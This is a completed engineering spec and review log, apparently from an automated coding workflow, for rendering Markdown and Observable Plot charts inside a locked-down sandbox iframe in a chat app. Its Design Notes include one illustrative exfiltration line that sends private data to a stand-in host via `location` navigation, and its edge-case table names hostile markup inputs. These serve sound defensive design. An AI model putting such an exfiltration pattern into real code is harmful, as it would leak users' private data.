---
title: 'Rich MDX rendering (Markdown + charts) in the Ring 3 sandbox'
type: 'feature'
created: '2026-07-11'
status: 'done'
review_loop_iteration: 0
followup_review_recommended: false
baseline_revision: 'f744b7a27eaec17014e539e107f28aa82fc08f2c'
final_revision: '84b7f5cb17e92bff55a01e5fbfa35486b4059872'
context: []
warnings: ['oversized']
---

<intent-contract>

## Intent

**Problem:** Epic 5's marquee payoff (FR-17, SM-5) — the reason the Story 5.5 sandbox was built — is still unrealized: the sandbox renders only a proof-of-loop table, is wired into no user-facing surface, and the chat renders assistant answers as plain text. Answers cannot show rich Markdown or interactive charts, so nothing yet justifies the sandbox's cost.

**Approach:** Turn Ring 3 into a real renderer driven **entirely by the trusted guest bundle** over validated, declarative inputs: Markdown text (via `micromark`, HTML-escaped) and a whitelisted `ChartSpec` → Observable Plot (AR-14, AD-10). Extend the one-way `render` frame to carry `{ markdown, chart, data }` (protocol → 2), extract a `` ```chart `` spec from the model's answer, and mount `SandboxFrame` in the chat message tree for chart-bearing answers, pushing the result's canonical `FrozenData`. Fold in the three tractable Story-5.5 deferrals this wiring makes natural. Runtime evaluation of untrusted model-authored JavaScript (`'unsafe-eval'`) is deliberately **out of scope** — it would weaken the 5.5 boundary and activate the reserved data-exfiltration security decision (see Block If / Design Notes).

## Boundaries & Constraints

**Always:**
- **The Story 5.5 process boundary is unchanged.** Guest CSP stays byte-for-byte as 5.5 (`default-src 'none'; script-src 'self'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'`) — no `'unsafe-eval'`; iframe stays `sandbox="allow-scripts"` with no `allow-same-origin`; separate loopback origin; no token/secret in the guest.
- Rich content is drawn **only by the trusted guest bundle** from validated declarative inputs. Markdown is rendered HTML-escaped with raw-HTML/`<script>` disabled; a `ChartSpec` (whitelisted `mark` ∈ {line, bar, dot, area}; `x`/`y`/optional `series` naming existing `data.columns`; bounded `title`) drives Observable Plot. No model-authored string is ever `eval`/`new Function`.
- `src/sandbox/` imports only `src/shared/` + third-party render libs (`@observablehq/plot`, `micromark`) — never `src/core`, `src/ui`, `ai`, `@ai-sdk`, or anything holding secrets (grep-enforced).
- The inbound `render` frame is one-way, protocol-versioned (`SANDBOX_PROTOCOL_VERSION = 2`), and every field is runtime-validated by `isSandboxInbound` (markdown is a length-capped string; chart is `null` or a valid `ChartSpec` whose channels reference existing columns; data via `decode`).
- `SandboxOutbound` is unchanged (`ready` | `height` | `datum-clicked` | `error`) — capability still cannot flow inward, and the guest still cannot request data or trigger a query.
- FrozenData pushed to the guest is the single canonical `src/shared/` shape (ISO-8601 UTC dates, typed values) — AR-11 / AC #3.
- Charts use Observable Plot 0.6.17 (Ring 3 has no React host); the guest bundle is produced by `scripts/build-sandbox.ts`.

**Block If:**
- Delivering "embedded executable JS" is taken to require runtime evaluation of untrusted model JavaScript — i.e. adding `'unsafe-eval'` to the guest CSP, adding `allow-same-origin`, relaxing `connect-src`/`default-src`, or otherwise weakening the 5.5 process boundary. HALT: this activates the reserved same-frame-navigation `FrozenData` exfiltration decision (5.5 deferred ledger) and widening the boundary is a human security call.
- Satisfying the render would require pushing anything other than already-derived, non-secret render data (a key, token, live DB handle, or capability) into the guest.

**Never:**
- Never `eval` / `new Function` / add `'unsafe-eval'` for model-authored JS; never render raw model HTML or `<script>` (markdown is escaped).
- Never weaken the 5.5 boundary (`allow-same-origin`, relaxed CSP, exposure beyond loopback).
- Never render charts with Recharts/React in Ring 3 (AD-10: Recharts is Ring 2 / Epic 6 only); never add a second charting library.
- Never let a chart channel reference a column absent from the pushed `data`; never change `SandboxOutbound`'s shape.

## I/O & Edge-Case Matrix

| Scenario | Input / State | Expected Output / Behavior | Error Handling |
|----------|--------------|---------------------------|----------------|
| Chart-bearing answer | assistant `text` has a valid `` ```chart `` fence and the message's query run produced rows | Ring 2 extracts + validates the spec, mounts `SandboxFrame`, pushes `{markdown, chart, data}`; guest renders Markdown + a Plot chart, emits `ready` then `height` | No error expected |
| Plain answer | `text` has no `` ```chart `` fence | existing Ring 2 plain-text rendering; no `SandboxFrame` mounted | No error expected |
| Invalid/absent chart | fence missing, malformed JSON, unknown `mark`, or channel names a missing column | `parseChartSpec` → `null`; render Markdown only, no chart, no throw | chart coerced to `null`, ignored |
| Cleared block | doc prop transitions to `null` (message/tab cleared) | `SandboxFrame` pushes an empty render frame; guest `replaceChildren` clears the prior draw | No stale draw |
| Malformed inbound frame | frame fails `isSandboxInbound` (bad version/markdown/chart/data) | guest drops it; emits nothing; no origin pinned on a bad first frame | Dropped |
| Untrusted markdown HTML | markdown contains `<script>` / `<img onerror>` / raw HTML | `micromark` escapes raw HTML; CSP `script-src 'self'` blocks any inline handler; nothing executes | Neutralized |
| Height flood | hostile guest emits rapid `height` signals | `SandboxFrame` coalesces `setHeight` via `requestAnimationFrame` and clamps ≤ `MAX_FRAME_HEIGHT` | Rate-limited, no thrash |
| Iframe reload / late window | guest frame reloads, or `contentWindow` is null at mount | `SandboxFrame` re-resolves `contentWindow` and rebuilds the host on iframe `load`, then re-pushes the current doc | No silently dead channel |

</intent-contract>

## Code Map

- `src/shared/chart-spec.ts` (NEW, + `.test.ts`) -- dependency-free `ChartSpec` type + `MARK_KINDS` whitelist; `extractChartFence(text): { markdown: string; rawChart: unknown | null }` (pure: strips the first `` ```chart `` block, returns remaining prose + parsed JSON or null on absence/parse error); `parseChartSpec(raw: unknown, columnNames: readonly string[]): ChartSpec | null` (validates `mark` ∈ whitelist, `x`/`y`/optional `series` are strings present in `columnNames`, `title` optional string ≤ 200). Pure, no Plot/DOM imports.
- `src/shared/contract.ts` (EDIT, + `.test.ts`) -- bump `SANDBOX_PROTOCOL_VERSION` 1 → 2; widen `SandboxInbound` `render` frame to `{ type:"render"; protocolVersion; markdown: string; chart: ChartSpec | null; data: FrozenData }`; extend `isSandboxInbound` to validate `markdown` (string, length ≤ 20000 — untrusted text), `chart` (`null` or `parseChartSpec` valid against `data`'s columns), `data` (via `decode`). `SandboxOutbound` untouched.
- `src/sandbox/render.ts` (NEW, + `.test.ts`) -- Ring 3 render helpers: `renderMarkdownToHtml(md: string): string` (`micromark`, raw HTML disabled); `buildPlotOptions(chart: ChartSpec, data: FrozenData): PlotOptions` (imports `@observablehq/plot`, pure — maps rows→records and the spec→marks/channels, returns the options object); `frozenToRecords(data): Record<string, unknown>[]`. Pure and unit-testable (assert the options object + escaped HTML); the actual `Plot.plot(...)`/DOM write stays in the guest bootstrap.
- `src/sandbox/guest.ts` (EDIT, + `.test.ts`) -- widen the `render` seam from `(data: FrozenData) => number` to `(doc: SandboxRenderDoc) => number`; router passes `{ markdown, chart, data }` from the validated frame. Bootstrap composes: `body.replaceChildren()` (clears prior draw), append a prose node (`innerHTML = renderMarkdownToHtml(markdown)`), and if `chart`, append `Plot.plot(buildPlotOptions(chart, data))`; measure `scrollHeight`. Keep handshake pinning, inbound drops, and the `datum-clicked` channel (best-effort from chart clicks; not required by any AC).
- `src/core/chat.ts` (EDIT, + `.test.ts`) -- extend `buildChatSystemPrompt` to instruct the model: when a visualization aids the answer, emit exactly one `` ```chart `` fenced JSON spec (whitelisted `mark`; `x`/`y` = result column names), and write prose as Markdown. No other Core/streaming change — the spec rides in the answer text.
- `src/ui/sandbox/sandbox-host.ts` (EDIT, + `.test.ts`) -- replace `pushData(frozenData)` with `pushDoc(doc: SandboxRenderDoc)` posting the extended `render` frame (targetOrigin `"*"`, unchanged rationale); keep identity + opaque-origin inbound gating. `buildSandboxIframeAttrs` unchanged.
- `src/ui/sandbox/SandboxFrame.tsx` (EDIT, + `.test.tsx`) -- prop becomes `doc: SandboxRenderDoc | null`; **hardening (Story-5.5 deferrals):** re-resolve `contentWindow` and rebuild the host on the iframe `load` event (re-push the current doc); on `doc === null` push an empty frame (empty markdown, `chart:null`, empty `FrozenData`) to clear; coalesce `setHeight` via `requestAnimationFrame`. Clamp height ≤ `MAX_FRAME_HEIGHT` (unchanged).
- `src/ui/workspace/ChatTabView.tsx` (EDIT, + `.test.tsx`) -- for an assistant message whose `text` yields a valid chart spec **and** whose query run produced rows, build the render doc (`markdown` = prose from `extractChartFence`, `chart` = `parseChartSpec(raw, columns)`, `data` = the run's `FrozenData`) and mount `<SandboxFrame>` as a sibling of `<ChatQueryRun>`. Plain / chart-less messages keep the current plain-text bubble.
- `src/sandbox/containment.test.ts` (EDIT) -- update valid-render fixtures + version-mismatch case to protocol 2; assert the guest CSP is **unchanged** (contains `default-src 'none'` and `connect-src 'none'`, and does **not** contain `unsafe-eval`); confirm the widened inbound frame still exposes no inward capability and `SandboxOutbound` is unchanged.
- `package.json` (EDIT) -- add `@observablehq/plot@0.6.17` and `micromark` to `dependencies`. `scripts/build-sandbox.ts` (EDIT) -- set `minify: true` for the guest bundle (Plot + micromark ship in the compiled binary).

## Tasks & Acceptance

**Execution:**
- [x] `src/shared/chart-spec.ts` (+ `.test.ts`) -- `ChartSpec`/`MARK_KINDS`, `extractChartFence`, `parseChartSpec`; unit-test: valid spec parses; unknown mark / non-string channel / column-not-in-data / oversized title → `null`; `extractChartFence` splits prose from a `` ```chart `` block, returns `rawChart:null` when absent or JSON-invalid, and leaves prose intact.
- [x] `src/shared/contract.ts` (+ `.test.ts`) -- protocol bump to 2, widened `SandboxInbound` + `isSandboxInbound`; test the guard accepts a valid `{markdown,chart,data}` frame and rejects wrong version, non-string/oversized markdown, a chart naming a missing column, malformed chart, and invalid `FrozenData`.
- [x] `src/sandbox/render.ts` (+ `.test.ts`) -- `renderMarkdownToHtml` (assert headings/bold render and that raw `<script>`/`<img onerror>` are escaped, not emitted live), `buildPlotOptions` (assert marks/channel mapping + record conversion for each `MARK_KINDS` value and a `series` grouping), `frozenToRecords`.
- [x] `src/sandbox/guest.ts` (+ `.test.ts`) -- widen the `render` seam + bootstrap compose (clear → markdown → chart → measure); test (stub `postToParent`/`render`): valid widened frame → `ready`+`height`; malformed/wrong-version/`run-query`/`data-request` inbound dropped with no outbound; handshake still pins parent.
- [x] `src/core/chat.ts` (+ `.test.ts`) -- system-prompt chart instruction; test the prompt includes the `` ```chart `` directive and the whitelisted marks, and that SQL-block behavior is preserved.
- [x] `src/ui/sandbox/sandbox-host.ts` (+ `.test.ts`) -- `pushDoc`; test a `render` frame with `{markdown,chart,data}` is posted to the iframe window, a valid outbound routes to `onSignal`, and a foreign-source message is dropped.
- [x] `src/ui/sandbox/SandboxFrame.tsx` (+ `.test.tsx`) -- `doc` prop + hardening; test (renderToStaticMarkup + pure host stubs): iframe carries `allow-scripts` and no `allow-same-origin`; a `load` event rebinds the host and re-pushes; `doc:null` pushes an empty frame; rapid `height` signals coalesce to one applied height.
- [x] `src/ui/workspace/ChatTabView.tsx` (+ `.test.tsx`) -- mount `SandboxFrame` for a chart-bearing message with run rows; test: such a message renders a `SandboxFrame` (with the composed doc) beside `ChatQueryRun`; a plain answer renders the plain-text bubble and no `SandboxFrame`.
- [x] `package.json` + `scripts/build-sandbox.ts` -- add `@observablehq/plot@0.6.17` + `micromark`; enable guest-bundle minify; `bun run build` produces both bundles with the guest bundle including Plot + micromark.
- [x] `src/sandbox/containment.test.ts` -- protocol-2 fixtures + the CSP-unchanged / no-`unsafe-eval` assertions and the no-inward-capability re-confirmation.

**Acceptance Criteria:**
- Given an assistant answer carrying a valid `` ```chart `` spec and a query result, when it renders in chat, then an interactive Observable Plot chart appears inside the Ring 3 sandbox iframe, sized to its content — verified by `ChatTabView`/`SandboxFrame` structure tests and `buildPlotOptions` unit tests. (Epic AC #1)
- Given the rich block renders, when the guest executes, then only the trusted bundle runs — no `'unsafe-eval'`, no `allow-same-origin`, unchanged CSP with `connect-src 'none'` — so it has no path to host, filesystem, network, or credentials, proven by the containment battery. (Epic AC #2, security property)
- Given data is pushed to the sandbox, when it is rendered, then it uses the canonical `src/shared/` `FrozenData` shape (ISO-8601 UTC, typed), validated by `isSandboxInbound`/`decode`. (Epic AC #3)
- Given ring isolation, when the build runs, then `src/sandbox/` imports only `src/shared/` + `@observablehq/plot`/`micromark` (grep-verified), and `bunx tsc --noEmit` + `bun test` + `bun run build` all pass.

## Spec Change Log

_No bad_spec loopbacks — the intent contract and spec sections held through review. All review findings triaged to patch or reject._

## Review Triage Log

### 2026-07-11 — Review pass
- intent_gap: 0
- bad_spec: 0
- patch: 10: (high 1, medium 4, low 5)
- defer: 0
- reject: 5
- addressed_findings:
  - `[high]` `[patch]` Chart-bearing messages rendered the raw `` ```chart `` JSON and duplicated prose in the plain bubble (feature happy-path looked broken). `ChatTabView` now shows fence-stripped prose in the bubble and suppresses it once the sandbox (rich prose+chart) is mounted. (`src/ui/workspace/ChatTabView.tsx`)
  - `[medium]` `[patch]` The composed doc got a fresh object identity every render, re-posting the render frame + rebuilding Plot on each keystroke (UI-thread jank vs NFR-6). Memoized per-message docs (stable identity keyed on messages+runs). (`src/ui/workspace/ChatTabView.tsx`)
  - `[medium]` `[patch]` Prose > 20000 chars was dropped whole by the guest guard → blank iframe, no diagnostics. Host now truncates prose to `MAX_SANDBOX_MARKDOWN_LENGTH` with a marker and wires `SandboxFrame` `onError`. (`src/ui/workspace/ChatTabView.tsx`)
  - `[medium]` `[patch]` A `Plot.plot` throw left the frame stuck at a stale size (height never emitted). The guest render seam now catches the chart-build throw, renders prose + an inline note, and still returns `scrollHeight`. (`src/sandbox/guest.ts`)
  - `[medium]` `[patch]` `extractChartFence` leaked raw/partial JSON on unterminated fences or a `` ``` `` inside a JSON string value. The fence match now requires a line-start close and handles unterminated fences without leaking. (`src/shared/chart-spec.ts`)
  - `[low]` `[patch]` Markdown link/image URLs were unsanitized (contained only by CSP). `renderMarkdownToHtml` now neutralizes non-`http(s)`/`mailto`/relative schemes; the guest CSP is documented as the load-bearing backstop. (`src/sandbox/render.ts`)
  - `[low]` `[patch]` Zero-row query results produced a degenerate chart. `buildChartDoc` now sets `chart:null` for empty rows (prose still renders). (`src/ui/workspace/ChatTabView.tsx`)
  - `[low]` `[patch]` `buildFrozenHtml` + the `data-row`/`data-col` table click path were dead after the new draw; removed them (the `SandboxOutbound` `datum-clicked` type is unchanged). (`src/sandbox/guest.ts`)
  - `[low]` `[patch]` The CSP-unchanged test only substring-checked; strengthened to assert the exact Story-5.5 CSP string (`toBe`) plus `not.toContain("unsafe-eval")`. (`src/sandbox/containment.test.ts`)
  - `[low]` `[patch]` `SandboxFrame`'s `load` handler dead-ended when `contentWindow` was null at load; it now retries/rebinds so a late window still gets a live channel. (`src/ui/sandbox/SandboxFrame.tsx`)
- rejected (noise/by-design): guest renders raw vs `decode`d data (adjudicated benign in 5.5); Plot possibly emitting `blob:`/external images (browser-level residual, manual-check posture); duplicate column names collapsing in `frozenToRecords` (pathological input; records-by-name is standard); `EMPTY_RENDER_DOC` clear-on-null "unreachable" (correct defensive code, kept); non-numeric column on a quantitative axis (Plot coerces; the Plot-throw resilience patch makes any throw graceful).
- security spine (re-confirmed): CSP byte-for-byte 5.5 (no `unsafe-eval`), no `allow-same-origin`, `SandboxOutbound` unchanged, one-way channel, ring isolation clean, no `eval`/`new Function` of model text — the 5.5 boundary is intact and the two hard 5.5 deferrals (same-frame-nav exfil, exposed-mode) are NOT activated because only the trusted bundle executes.

### 2026-07-11 — Review pass (follow-up)
- intent_gap: 0
- bad_spec: 0
- patch: 3: (high 0, medium 1, low 2)
- defer: 0
- reject: 10
- addressed_findings:
  - `[medium]` `[patch]` The plain bubble keyed on the PARSED spec (`rawChart !== null`), so a well-formed `` ```chart `` fence whose JSON body is malformed leaked the raw `` ```chart `` block into the chat bubble — the exact "invalid chart" edge the I/O matrix says must render Markdown only (P1 violation). `decideMessageView` now keys the bubble on `extractChartFence`'s stripped `markdown` directly (which equals the original text only when no fence matched), so a malformed-JSON fence still strips. (`src/ui/workspace/ChatTabView.tsx`)
  - `[low]` `[patch]` A protocol-relative `//host/…` link destination passed `isSafeUrl` as "relative" (no explicit scheme) and survived as a live off-origin `href`. `isSafeUrl` now rejects a leading `//`. (`src/sandbox/render.ts`)
  - `[low]` `[patch]` The guest forwards the RAW inbound `chart`; a `{series:null}`/`{title:null}` frame passes `isSandboxInbound` (parseChartSpec normalizes null→absent) but reached `buildMark`/`buildPlotOptions` as a null channel/title (the `!== undefined` guard let `null` through). Guards tightened to `!= null` to mirror the validator's normalization (contained regardless — Plot is trusted and a throw is caught). (`src/sandbox/render.ts`)
- rejected (noise/by-design): `data:` Markdown images not rendering (micromark's own sanitizer blanks a non-http(s) image `src` upstream — the CSP `img-src data:` is simply unexercised by the Markdown path; marginal feature, not fixable at the post-process layer); prose lost if the sandbox iframe never loads at all (catastrophic infra failure covered by the documented manual-check / residual-risk posture; bubble-suppression is the chosen design); stale `sandboxErrors[i]` after a later successful render (the append-only message log keeps the index stable; error-then-recover is a rare, low-consequence path with no success signal wired); served guest `<style>` still styles the removed 5.5 table and not `.qs-prose`/`.qs-chart-error` (cosmetic — prose renders with browser defaults; `sandbox-server.ts` is untouched by this story); `datum-clicked`/`onDatumClicked` now unreachable (by design — the table-click path was intentionally removed and `SandboxOutbound` intentionally kept byte-for-byte unchanged); `reconcileChartDocs` writing the cache ref inside `useMemo` (idempotent, identity-stable standard memo-cache pattern); `truncateMarkdown` slicing mid-token at 20000 chars (pathological length, cosmetic — the frame stays valid); no in-`bun test` proof Plot/d3 run under `script-src 'self'` without `'unsafe-eval'` (verification gap already recorded as residual risk / manual devtools check); pre-run bubble showing raw Markdown source (by design — the plain bubble is plain text until the sandbox owns the render); `frozenToRecords` last-wins on duplicate column names (re-adjudicated reject — pathological `SELECT a AS x, b AS x`; records-by-name is standard).
- security spine (re-confirmed): guest CSP byte-for-byte 5.5 (`grep` confirms no `unsafe-eval`; `connect-src 'none'` present), `allow-same-origin` only in comments/negative assertions, ring-isolation grep empty, `SandboxOutbound` unchanged, one-way channel intact. The three patches touch only Ring-2/Ring-3 render composition + URL sanitization — the 5.5 process boundary is untouched and neither hard 5.5 deferral is activated.

## Design Notes

- **Why declarative, not `eval` (the core security call).** Epic AC #2 asserts a *containment property* ("runs only within the 5.5 boundary — never host/fs/network/credentials"), not a specific execution mechanism. Running genuinely untrusted model JS would need `'unsafe-eval'` on the guest CSP AND would make the 5.5-deferred same-frame-navigation exfiltration live: a hostile guest could `location = "http://x/?"+data` to leak the user's private `FrozenData` (top-frame self-navigation is not governed by `connect-src`). Closing that is a reserved human security decision (5.5 ledger). By rendering with the **trusted bundle** over a whitelisted `ChartSpec` + escaped Markdown, we deliver the marquee value (interactive charts + rich prose) while the boundary stays byte-for-byte 5.5 and neither hard deferral is activated. `'unsafe-eval'` is a Block If, not a silent choice.
- **The render seam widens; the channel and containment do not.** Story 5.5 wired `render: (FrozenData) => number` via `body.innerHTML`. 5.6 replaces the seam body with `replaceChildren` → markdown node → `Plot.plot(...)` node → `scrollHeight`, and widens the seam arg to the full doc. `SandboxInbound`/version change; `SandboxOutbound` and the one-way guarantee do not (containment test (e) stays green).
- **Micromark + Plot are CSP-clean.** `micromark` with raw-HTML disabled emits escaped HTML (no live `<script>`/handlers, and CSP would block them anyway). Observable Plot draws inline SVG/DOM from same-origin bundle code (`script-src 'self'`), inline styles (`style-src 'unsafe-inline'`), no fetches (`connect-src 'none'`) — so no CSP change is needed. Keep marks to line/bar/dot/area to avoid `blob:`/raster paths not permitted by `img-src data:`.
- **Folded 5.5 deferrals (natural now that the frame is wired for real):** rebind `contentWindow` on iframe `load`; clear on `doc:null` by pushing an empty frame (`replaceChildren`); coalesce `height` via rAF. The two hard deferrals (same-frame-nav exfil; exposed-mode reachability) remain deferred and are *not* activated because no untrusted JS runs.
- **Chart-spec example (declarative, validated):**
  ```chart
  { "mark": "line", "x": "month", "y": "revenue", "series": "region", "title": "monthly revenue" }
  ```
  → `parseChartSpec` checks the mark + that `month`/`revenue`/`region` exist in `data.columns`; `buildPlotOptions` → `{ title, marks:[Plot.line(records,{x:"month",y:"revenue",stroke:"region"})] }`.

## Verification

**Commands:**
- `bun test` -- expected: all suites pass, incl. new `chart-spec`, `render`, extended `contract`/`guest`/`sandbox-host`/`SandboxFrame`/`ChatTabView`, and the updated `containment` battery.
- `bunx tsc --noEmit` -- expected: no type errors.
- `bun run build` -- expected: produces `ui-bundle.generated.ts` and `sandbox-bundle.generated.ts`; the guest bundle includes Observable Plot + micromark.
- `grep -rEn 'from "(\.\./core|\.\./\.\./core|\.\./ui|ai|@ai-sdk/)' src/sandbox` -- expected: no matches (Ring 3 imports only `src/shared/` + render libs).
- `grep -rn "unsafe-eval" src/core/sandbox-server.ts` -- expected: no match (boundary unchanged).
- `grep -rn "connect-src 'none'" src/core/sandbox-server.ts` -- expected: present.
- `grep -rn "allow-same-origin" src/ui src/sandbox` -- expected: only in negative test assertions.

**Manual checks (browser-level, not CLI-testable):**
- Boot the app, open a chat, ask a question whose answer includes a `` ```chart `` spec and runs a query: the sandbox iframe (distinct origin) renders the Markdown + an interactive Observable Plot chart, reports its height, and clearing the message clears the draw.
- In devtools, confirm the guest response CSP is unchanged from 5.5 (no `unsafe-eval`), and a `fetch`/navigation from inside the guest cannot exfiltrate via `connect-src`.

## Auto Run Result

Status: done

**Summary.** Ring 3 is now a real renderer wired into the chat. LLM answers may carry a `` ```chart `` JSON spec (whitelisted `mark` ∈ {line, bar, dot, area}; `x`/`y`/optional `series` naming result columns); the Core system prompt instructs the model to emit it plus Markdown prose. `ChatTabView` extracts the spec, and for a chart-bearing message whose query run produced rows it mounts `SandboxFrame` (suppressing the plain bubble to avoid duplication), pushing the canonical `FrozenData` plus prose into the guest. The trusted guest bundle renders the Markdown (via `micromark`, raw HTML disabled + URL-scheme neutralized) and an interactive Observable Plot chart — **entirely within the unchanged Story-5.5 boundary**: guest CSP byte-for-byte 5.5 (no `unsafe-eval`), `sandbox="allow-scripts"` with no `allow-same-origin`, separate loopback origin, one-way protocol-v2 `render` frame, `SandboxOutbound` unchanged. No model-authored string is ever `eval`/`new Function`'d; runtime evaluation of untrusted JS (which would weaken the boundary and activate the reserved same-frame-navigation exfiltration decision) was deliberately kept out of scope (Block If / Never).

**Files changed:**
- `src/shared/chart-spec.ts` (NEW, + test) -- dependency-free `ChartSpec`/`MARK_KINDS`, `extractChartFence` (line-start-close fence parse, no partial-JSON leak), `parseChartSpec` (whitelist + column-ref validation).
- `src/shared/contract.ts` (+ test) -- `SANDBOX_PROTOCOL_VERSION` → 2; `SandboxRenderDoc`; widened `SandboxInbound` `render` frame `{markdown, chart, data}`; `isSandboxInbound` validates markdown length (`MAX_SANDBOX_MARKDOWN_LENGTH`), chart (null-or-valid vs decoded columns), data (`decode`). `SandboxOutbound` untouched.
- `src/sandbox/render.ts` (NEW, + test) -- `renderMarkdownToHtml` (micromark, raw HTML off + dangerous URL-scheme neutralization), `buildPlotOptions` (spec→Plot marks/channels per mark + `series`), `frozenToRecords`.
- `src/sandbox/guest.ts` (+ test) -- render seam widened to `(doc) => number`; bootstrap composes `replaceChildren` → prose node → Plot node (throw-resilient: on chart error renders prose + inline note and still returns `scrollHeight`); dead `buildFrozenHtml`/table-click path removed.
- `src/core/chat.ts` (+ test) -- `buildChatSystemPrompt` emits the `` ```chart `` directive (whitelisted marks, columns) + Markdown; SQL-block behavior preserved.
- `src/ui/sandbox/sandbox-host.ts` (+ test) -- `pushData` → `pushDoc(doc)` posting the widened frame; identity + opaque-origin gating unchanged.
- `src/ui/sandbox/SandboxFrame.tsx` (+ test) -- `doc` prop; hardening: rebind host on iframe `load` (retry when `contentWindow` null), clear-on-null via `EMPTY_RENDER_DOC`, rAF-coalesced height.
- `src/ui/workspace/ChatTabView.tsx` (+ test) -- `decideMessageView`/`reconcileChartDocs`/`buildChartDoc`/`truncateMarkdown`: memoized per-message docs (no per-keystroke re-post), fence-stripped bubble, `chart:null` on zero rows, `onError` wired, sandbox mounted beside `ChatQueryRun`.
- `scripts/build-sandbox.ts` -- guest bundle minified. `package.json` -- `@observablehq/plot@0.6.17` + `micromark`.
- `src/sandbox/containment.test.ts` -- protocol-2 fixtures; CSP asserted byte-for-byte vs the Story-5.5 string + `not.toContain("unsafe-eval")`; no-inward-capability re-confirmed.

**Review findings.** Two adversarial reviewers (Blind Hunter + Edge Case Hunter) at session capability. Triage: **0 intent_gap, 0 bad_spec, 10 patches applied** (1 high: raw-JSON/duplicate-prose in the bubble; 4 medium: per-render re-post jank, oversized-prose silent drop, Plot-throw stale frame, chart-fence JSON leak; 5 low: markdown URL sanitization, zero-row chart skip, dead table-click removal, byte-for-byte CSP assertion, null-`contentWindow` rebind), **0 deferred, 5 rejected**. The security spine was re-confirmed intact — the 5.5 boundary is byte-for-byte unchanged and neither hard 5.5 deferral is activated (only the trusted bundle runs).

**Verification.** `bunx tsc --noEmit` clean. `bun test` → **844 pass / 0 fail** across 50 files. `bun run build` produces both bundles (guest bundle ~342 KB, includes Observable Plot + micromark, minified). `grep -rEn 'from "(\.\./core|\.\./\.\./core|\.\./ui|ai|@ai-sdk/)' src/sandbox` → empty. `unsafe-eval` absent from `sandbox-server.ts`; `connect-src 'none'` present; `allow-same-origin` only in comments/negative assertions; `buildFrozenHtml`/`resolveDatumClick` fully removed.

**Residual risks.** Browser-level enforcement (live CSP/sandbox behavior, actual Plot pixels, real cross-origin iframe render) is not exercisable in `bun test` (no headless harness) — covered by the documented manual devtools check, same posture as Stories 5.4/5.5. The two hard Story-5.5 deferrals (same-frame-navigation `FrozenData` exfiltration; exposed-mode sandbox reachability) remain open by design and are not activated here because no untrusted JS executes; if a future story enables runtime evaluation of untrusted model JS, both become live and require the reserved human security decision. A follow-up independent review is recommended given the breadth (contract + guest + render + chat UI + containment) and the volume/severity of the applied patches.

**Follow-up review pass (2026-07-11).** Two fresh adversarial reviewers (Blind Hunter + Edge Case Hunter, session capability) re-swept the full diff. Triage: **0 intent_gap, 0 bad_spec, 3 patches applied, 0 deferred, 10 rejected**. Patches (all localized, all with new locking tests): (1) `[medium]` `decideMessageView` leaked the raw `` ```chart `` block into the bubble when the fence's JSON was malformed — the bubble now keys on the fence-stripped prose, not on parse success (P1); (2) `[low]` `isSafeUrl` now rejects protocol-relative `//host` link destinations; (3) `[low]` `buildMark`/`buildPlotOptions` guard channels/title with `!= null` so a raw `{series:null}` frame can't hand Plot a null channel. The 10 rejects were noise/by-design (notably: `data:` Markdown images are blanked by micromark upstream, not our allowlist; the dead `datum-clicked` type is intentionally kept for an unchanged `SandboxOutbound`; the total-iframe-failure prose-loss is the chosen sandbox-render design under the documented residual-risk posture). Verification: `bunx tsc --noEmit` clean; `bun test` → **847 pass / 0 fail** (844 + 3 new); `bun run build` produces both bundles; all isolation/security greps hold (ring-isolation empty, no `unsafe-eval`, `connect-src 'none'` present, `allow-same-origin` only in negative assertions). The 5.5 process boundary is byte-for-byte unchanged. Given this pass made only three localized, low-consequence, well-tested fixes — and the artifact is converging (10 patches last pass → 3 minor this pass) — no further independent review is recommended.
